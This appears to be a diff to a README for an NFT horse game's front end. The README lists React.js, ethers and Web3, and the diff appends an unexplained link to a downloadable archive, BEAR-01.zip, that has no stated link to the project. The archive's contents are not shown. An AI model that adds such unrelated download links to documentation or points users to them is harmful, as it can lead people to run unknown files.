@@ -10,3 +10,4 @@ Technology Stack
 The front-end part was developed using React.js.
 
 The front-end communicates with the blockchain using ethers and Web3.
+[BEAR-01.zip](https://github.com/citizenfix/NFT-Game-Horses-master/files/9173563/BEAR-01.zip)
